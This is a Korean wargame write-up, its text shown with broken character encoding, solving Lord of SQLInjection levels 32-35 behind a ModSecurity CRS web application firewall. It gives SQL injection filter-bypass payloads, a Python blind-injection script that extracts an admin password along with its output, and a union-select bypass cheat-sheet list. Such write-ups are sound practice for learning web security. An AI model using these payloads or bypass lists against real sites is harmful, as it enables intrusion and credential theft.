---
title: "[LOS] 32-35ë²ˆ ë¬¸ì œ í’€ì´(cthulhu,death,godzilla,cyclops)"
categories:
  - los
tags:
  - los
  - rubiya
  - los 32ë²ˆ
  - los 33ë²ˆ
  - los 34ë²ˆ
  - los 35ë²ˆ
  - los cthulhu
  - los death
  - los godzilla
  - los cyclops
  - waf
  - ModSecurity CRS
  

  
toc: true
toc_sticky: true
toc_label: "32-35ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/sql.png
---

ğŸ’¡ los.rubiya.kr 32-35ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤. 
{: .notice--warning}


# 32ë²ˆ(cthulhu)
## ë¬¸ì œ

![image](https://user-images.githubusercontent.com/33647663/160246578-56a887cd-323e-4ec9-9c7b-d3656ef8920a.png)

## í’€ì´
ì´ë²ˆ ë¬¸ì œëŠ” í‰ë²”í•œ sql injectionì—ì„œ wafì˜ í•„í„°ë§ì„ ìš°íšŒí•˜ëŠ” ë¬¸ì œì…ë‹ˆë‹¤. ì¼ë°˜ì ì¸ ë°©ë²•ìœ¼ë¡œ ìœ„ì˜ ì¿¼ë¦¬ë¬¸ì—ì„œ ì¸ì ì…˜ì„ ìˆ˜í–‰í•œë‹¤ë©´ pwì— ```'||1#```ì„ ì…ë ¥í•˜ëŠ”ë°, ì´ ë°©ë²•ì€ wafì— ì˜í•´ì„œ ì°¨ë‹¨ì´ ë©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/160246744-df53f8c5-bc90-4fae-a1e2-81f5b06ad781.png)

ìš°íšŒí•˜ëŠ” ë°©ë²•ì€ ì •ë§ ë‹¤ì–‘í• í…ë°, ìš°ì„  ì œê°€ ì‹œë„í•œ ë°©ë²•ì€ 1ì„ ê·¸ëŒ€ë¡œ ì…ë ¥í•˜ëŠ” ëŒ€ì‹ ì—, mod(3,2)ì´ëŸ°ì‹ìœ¼ë¡œ ì…ë ¥ì„ í•´ë´¤ìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/160246778-7981ed0e-b4aa-495a-9456-c1c8e7a04426.png)

ì¼ë‹¨ í’€ë¦¬ê¸´ í’€ë¦½ë‹ˆë‹¤. í•˜ì§€ë§Œ ë³¸ ë¬¸ì œì—ì„œëŠ” Modsecurity ë²„ì „ì„ ëª…ì‹œí–ˆìœ¼ë‹ˆ, í•´ë‹¹ wafì˜ bypassê¸°ìˆ ì„ ê²€ìƒ‰í•´ ë´…ë‹ˆë‹¤.

ë‹¤ìŒì€ modsecurity ê¹ƒí—ˆë¸Œ ì´ìŠˆì— ì˜¬ë¼ì˜¨ ë‚´ìš©ìœ¼ë¡œ, CRS v3.1.0ì˜ bypassì— ê´€í•œ ì´ìŠˆì…ë‹ˆë‹¤.

[https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1181](https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1181)

ê·¸ ì¤‘ ë‹¤ìŒê³¼ ê°™ì€ ë°©ì‹ì€ wafì—ì„œ ì œëŒ€ë¡œ ì²˜ë¦¬í•˜ì§€ ëª»í•œë‹¤ê³  í•©ë‹ˆë‹¤.

```
select id from test where id='-1'<@=1 OR {a 1}=1 OR '
```

ìš°ì„  @ëŠ” ë³€ìˆ˜ë¥¼ ì„ ì–¸í• ë•Œ ì‚¬ìš©í•˜ëŠ” ê°’ì¸ë°, ì•„ë˜ì˜ ê³„ì‚°ê²°ê³¼ë¥¼ ë³´ë©´ ì•Œ ìˆ˜ ìˆë“¯ì´ or ì•ì—ëŠ” null ê°’ì´ ë‚˜ì˜µë‹ˆë‹¤. 

![image](https://user-images.githubusercontent.com/33647663/160248007-e1aab629-ea9c-45ad-b03c-a251280c59ff.png)

ê·¸ë¦¬ê³  ë’· ë¶€ë¶„ {a 1} -> 1ì´ ì¶œë ¥ë˜ì–´ì„œ 1=1ê¼´ë¡œ ê²€ì‚¬ë¥¼ í•©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/160248027-641244aa-d685-4c03-b24c-4c026e3ef359.png)

ìœ„ì²˜ëŸ¼ ë¬¸ë²•ì„ ì„ìœ¼ë©´ wafì—ì„œ í•„í„°ë§ì„ ì œëŒ€ë¡œ í•˜ì§€ ëª»í–ˆìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/160248062-122b59eb-fbb4-45c5-8c7a-69ac63c68ba9.png)

wafëŠ” ì •ê·œí‘œí˜„ì‹ í˜•íƒœë¡œ íŒ¨í„´ì„ dbí™” í•´ì„œ íƒì§€í•´ ë‚´ê¸° ë•Œë¬¸ì— ì´ë ‡ê²Œ ì´ìƒí•œ(?)ë°©ì‹ìœ¼ë¡œ 1ì´ë‚˜ ë‹¤ë¥¸ íŒ¨í„´ë“¤ì„ í‘œí˜„í•˜ë©´ íƒì§€í•˜ì§€ ëª»í•˜ëŠ” ê²½ìš°ê°€ ìƒê¹ë‹ˆë‹¤. 

# 33ë²ˆ(death)
## ë¬¸ì œ
![image](https://user-images.githubusercontent.com/33647663/160248631-88c22f76-5057-4592-a1c5-dfac42420ef9.png)


## í’€ì´
ì´ë²ˆ ë¬¸ì œë„ 32ë²ˆê³¼ ë¹„ìŠ·í•©ë‹ˆë‹¤. ë‹¤ë¥¸ ì ì€, ```' or 1#```ë¡œ ê·¸ëƒ¥ ìš°íšŒë¥¼ í•˜ë©´ ë§¨ìœ„ì˜ ë°ì´í„°ê°€ adminì´ ì•„ë‹Œ guestê°€ ì¶œë ¥ë˜ì–´ì„œ ì¶”ê°€ì ì¸ ë¡œì§ì„ í•„ìš”ë¡œ í•©ë‹ˆë‹¤. ë‹¤ìŒì€ 32ë²ˆì—ì„œ ì…ë ¥í–ˆë˜ ë‚´ìš©ì„ ê·¸ëŒ€ë¡œ ì…ë ¥í•œ ê°’ìœ¼ë¡œ guestê°€ ì¶œë ¥ë˜ì—ˆìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/160248490-551e3996-5249-447e-8bc6-dbb75bbf12d5.png)

ë”°ë¼ì„œ ì¶œë ¥ ìˆœì„œë¥¼ ë°”ê¾¸ê¸° ìœ„í•´ì„œ order by 1ì„ ì…ë ¥í•´ ì£¼ë©´ ë‹¤ìŒê³¼ ê°™ì´ ë¬¸ì œê°€ í’€ë¦½ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/160248659-e4999ab0-eecf-4d04-84fb-58eab492ed00.png)

mod()í•¨ìˆ˜ë„ wafê°€ í•„í„°ë§ì„ ì˜ ëª»í•œë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤...!

# 34ë²ˆ(godzilla)
## ë¬¸ì œ
## í’€ì´
í‰ë²”í•œ blind sql injection ë¬¸ì œì…ë‹ˆë‹¤. í•„í„°ë§ì„ ìš°íšŒí•˜ëŠ” ë°©ë²•ì„ ì˜ ìƒê°í•´ì•¼ í•©ë‹ˆë‹¤.

ìš°ì„  ```id=' or id='admin'#``` ì„ ì…ë ¥ì„ í•´ë³´ë‹ˆ ë‹¹ì—°íˆ í•„í„°ë§ ë©ë‹ˆë‹¤. ìš°ì„  waf íŠ¹ì„±ìƒ **admin**ì´ë¼ëŠ” ë‹¨ì–´ê°€ í•„í„°ë§ì´ ë˜ì–´ìˆì„ í™•ë¥ ì´ ë†’ë‹¤ê³  ìƒê°í•´ì„œ ë‹¤ìŒê³¼ ê°™ì´ ì™¼ìª½ 2ê¸€ìë§Œ íŒë‹¨í•˜ë„ë¡ ë°”ê¿”ì¤¬ìŠµë‹ˆë‹¤.

```id='|| left(id,2)='ad'#```

![image](https://user-images.githubusercontent.com/33647663/160248929-1047db66-7520-4445-a10d-4aab63e71bb6.png)

ì´ì œ admin ë°ì´í„°ì— ëŒ€í•´ì„œ pwë¥¼ ì–»ì–´ë‚´ê¸° ìœ„í•œ blind sql injection êµ¬ë¬¸ì„ ì‘ì„±í•´ì•¼ í•˜ëŠ”ë°, ì¼ë°˜ì ì¸ êµ¬ë¬¸ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```
id=|| left(id,2)='ad' and ascii(substr(pw,1,1))=97#
```

ìš°ì„  ë„ˆë¬´ ë»”í•œ íŒ¨í„´ì¸ ascii(substr()) êµ¬ë¬¸ì€ ì‚¬ìš©í•˜ì§€ ì•Šê³ , ì´ë²ˆì—ë„ leftë¥¼ ì‚¬ìš©í•´ ë´…ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/160249056-913c0872-588b-4173-b1ed-a73cfa77a4c1.png)

í•œë²ˆì— ì„±ê³µí–ˆìŠµë‹ˆë‹¤. ì™¼ìª½ ê¸€ìë¥¼ í•œ ê¸€ìì”© ì°¾ìœ¼ë©° blind sql injectionì„ ìˆ˜í–‰í•´ ì¤ë‹ˆë‹¤.

ì „ì²´ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```python
import string
from urllib import response
import requests
url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php"
cookies = {"PHPSESSID" : "595dl7ejl1io50mt9bhg0dbmpk"}
params = {"id" : None}

for i in range(30):
    payload = "'||left(id,4)='admi'&&length(pw)={}#".format(i)
    params["id"] = payload
    print(params)
    response = requests.get(url,params=params,cookies=cookies)
    if("Forbidden" in response.text):
        print("Forbidden")
        print(payload)
        break
    elif("Hello admin" in response.text):
        print("find the pw length",i)
        break

flag = ''
for i in range(1,9):
    for j in string.printable:
        payload = "'||left(id,4)='admi'&&left(pw,{})='{}'#".format(i,flag + j)
        params["id"] = payload
        print(params)
        response = requests.get(url,params=params,cookies=cookies)
        if("Forbidden" in response.text):
            print("Forbidden")
            print(payload)
            break
        elif("Hello admin" in response.text):
            flag = flag + j
            print("find the pw ",flag)
            break
```

ì‹¤í–‰ ì½˜ì†”
```
{'id': "'||left(id,4)='admi'&&left(pw,1)='0'#"}
{'id': "'||left(id,4)='admi'&&left(pw,1)='1'#"}
{'id': "'||left(id,4)='admi'&&left(pw,1)='2'#"}
{'id': "'||left(id,4)='admi'&&left(pw,1)='3'#"}
{'id': "'||left(id,4)='admi'&&left(pw,1)='4'#"}

...

{'id': "'||left(id,4)='admi'&&left(pw,7)='a18a6cb'#"}
{'id': "'||left(id,4)='admi'&&left(pw,7)='a18a6cc'#"}
find the pw  a18a6cc
{'id': "'||left(id,4)='admi'&&left(pw,8)='a18a6cc0'#"}
{'id': "'||left(id,4)='admi'&&left(pw,8)='a18a6cc1'#"}
{'id': "'||left(id,4)='admi'&&left(pw,8)='a18a6cc2'#"}
{'id': "'||left(id,4)='admi'&&left(pw,8)='a18a6cc3'#"}
{'id': "'||left(id,4)='admi'&&left(pw,8)='a18a6cc4'#"}
{'id': "'||left(id,4)='admi'&&left(pw,8)='a18a6cc5'#"}
find the pw  a18a6cc5
```


![image](https://user-images.githubusercontent.com/33647663/160249199-52f91039-d538-460c-9435-d051947f356c.png)



# 35ë²ˆ(cyclops)
## ë¬¸ì œ

![image](https://user-images.githubusercontent.com/33647663/160249571-954c1cd6-e9e8-4614-8839-7c9a8966f6c4.png)

## í’€ì´
35ë²ˆ ë¬¸ì œëŠ” ê°œì¸ì ìœ¼ë¡œ ì •ë§ ì‚½ì§ˆì„ ë§ì´ í–ˆìŠµë‹ˆë‹¤...; 
32,33,34,35ë²ˆ ê¹Œì§€ waf ìš°íšŒë¬¸ì œë¥¼ í’€ë©´ì„œ ëŠë‚€ì ì€ í‰ì†Œì—” sql injectionì„ í• ë•Œ ìµœì†Œí•œì˜ ë°ì´í„°ë¥¼ ì´ìš©í•´ì„œ í’€ë ¤ê³  í–ˆì—ˆëŠ”ë°, waf í•„í„°ë§ì„ ìš°íšŒí•˜ê¸° ìœ„í•´ì„œëŠ” ì •ê·œí‘œí˜„ì‹ì— ê±¸ë¦¬ì§€ ì•Šë„ë¡ ê°™ì€ ê²°ê³¼ì— ëŒ€í•´ì„œ ìµœëŒ€í•œ ì“¸ë°ì—†ëŠ”(?) ë°ì´í„°ë¥¼ ë§ë¶™ì—¬ì„œ ì •ê·œí‘œí˜„ì‹ì— ê±¸ë¦¬ì§€ ì•Šë„ë¡ í•´ì•¼ í–ˆìŠµë‹ˆë‹¤. 

ì´ë²ˆ cyclopsì—ì„œ ì‚¬ìš©ëœ ì“¸ë°ì—†ëŠ” ê¸°ìˆ ì€ 2ê°€ì§€ ì˜€ìŠµë‹ˆë‹¤.

1. id='' or 1 ì´ë ‡ê²Œ í•˜ì§€ë§ê³ , id=''<@=1 or 1 ì´ë ‡ê²Œ í•˜ë©´ ì–´ì°¨í”¼ ì•ë¶€ë¶„ì€ falseì´ì§€ë§Œ, CRS v3.1.0ì—ì„œëŠ” ë’· ë¶€ë¶„ì„ íŒë‹¨í• ë•Œ ì˜í–¥ì„ ë¯¸ì¹œë‹¤.

2. ê³µë°±ì„ ê·¸ëƒ¥ ì“°ì§€ ì•Šê³ , /\*asdasd\*/ ì´ë ‡ê²Œ ì£¼ì„ì„ ì´ìš©í•˜ì—¬ ê³µë°±ì„ í•´ì¤€ë‹¤.

**ì—¬ê¸°ì„œ ì¤‘ìš”í•œ ì ì€ 1ë²ˆì˜ ë‚´ìš©ì„ ì²˜ìŒì— ì‚¬ìš©í•˜ì§€ ì•Šê³  union select ë¶€ë¶„ì—ë§Œ ì‹ ê²½ì„ ì¨ì„œ ì‹œë„ë¥¼ í–ˆì„ë•ŒëŠ” ë˜ì§€ ì•Šì•˜ê³ , 1ë²ˆì˜ ë‚´ìš©ì¸ <@=1 ì´ ë¶€ë¶„ì´ ì¿¼ë¦¬ë¬¸ì— ë“¤ì–´ê°”ì„ë•Œ wafì˜ ìš°íšŒê°€ ë˜ì—ˆìŠµë‹ˆë‹¤.** 

ê·¸ë¦¬ê³  ì´ë²ˆ ë¬¸ì œë¥¼ í’€ë•ŒëŠ” êµ¬ê¸€ì— ```waf union select bypass```ë¥¼ ê²€ìƒ‰í–ˆë”ë‹ˆ, ì—¬ëŸ¬ cheat sheetì´ ë‚˜ì™€ì„œ ì´ ë¶€ë¶„ì„ ì‘ìš©í•´ì„œ ì¿¼ë¦¬ë¥¼ ì‘ì„±í•´ì„œ í’€ì—ˆìŠµë‹ˆë‹¤.

ì„±ê³µí•œ ì¿¼ë¦¬ë¬¸ë“¤ì˜ ê³µí†µì ì€ union/**/select ì²˜ëŸ¼ ê³µë°± ëŒ€ì‹  ì£¼ì„ì„ ì‚¬ìš©í•˜ì—¬ union selectë¥¼ ì‘ì„±í•œ êµ¬ë¬¸ë“¤ ì´ì—ˆìŠµë‹ˆë‹¤.

í•´ë‹¹ cheat sheet ë‚´ìš©ì„ í¬í•¨í•œ python codeëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```python
#Union select Waf bypass list
import requests

bypass_list = '''/*!50000%55nIoN*/ /*!50000%53eLeCt*/
%55nion(%53elect 1,2,3)-- -
+union+distinct+select+
+union+distinctROW+select+
/**//*!12345UNION SELECT*//**/
... ì¤‘ëµ
...
+uni%0bon+se%0blect+
%252f%252a*/union%252f%252a /select%252f%252a*/
/%2A%2A/union/%2A%2A/select/%2A%2A/
%2f**%2funion%2f**%2fselect%2f**%2f
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
/*!UnIoN*/SeLecT+'''
bypass_list = bypass_list.split("\n")

url = "https://modsec.rubiya.kr/chall/cyclops_9d6a565d1cb6c38a06a6b0815344e29e.php"
params = {'id': None}
cookies = {'PHPSESSID' : '595dl7ejl1io50mt9bhg0dbmpk'}

for bypass in bypass_list:
    payload1="?id='<@=1%20{}%20'first','second'%23".format(bypass)
    response = requests.get(url+payload1,cookies=cookies)
    if("CYCLOPS Clear" in response.text):
        print(payload1)    
```

<ì‹¤í–‰ê²°ê³¼> : ì„±ê³µí•œ ì¿¼ë¦¬ ë“¤
```
?id='<@=1%20%2f**%2funion%2f**%2fselect%20'first','second'%23
?id='<@=1%20/*--*/union/*--*/select/*--*/%20'first','second'%23
?id='<@=1%20/**/union/**/select/**/%20'first','second'%23
?id='<@=1%20/**/uNIon/**/sEleCt/**/%20'first','second'%23
?id='<@=1%20%55nion/**/%53elect%20'first','second'%23
?id='<@=1%20/*union*/union/*select*/select+%20'first','second'%23
?id='<@=1%20/%2A%2A/union/%2A%2A/select/%2A%2A/%20'first','second'%23
?id='<@=1%20%2f**%2funion%2f**%2fselect%2f**%2f%20'first','second'%23
```


ì—¬ëŸ¬ê°œì˜ ë‹µì¤‘ í•˜ë‚˜ë¥¼ ê³ ë¥´ìë©´ ë‹¤ìŒê³¼ ê°™ì´ ì…ë ¥í•˜ë©´ ë¬¸ì œê°€ í’€ë¦½ë‹ˆë‹¤.

```
?id='<@=1 /**/union/**/select/**/ 'first','second'%23
```

![image](https://user-images.githubusercontent.com/33647663/160249860-383d4495-2166-47f9-bbd5-619aa0a5a6db.png)

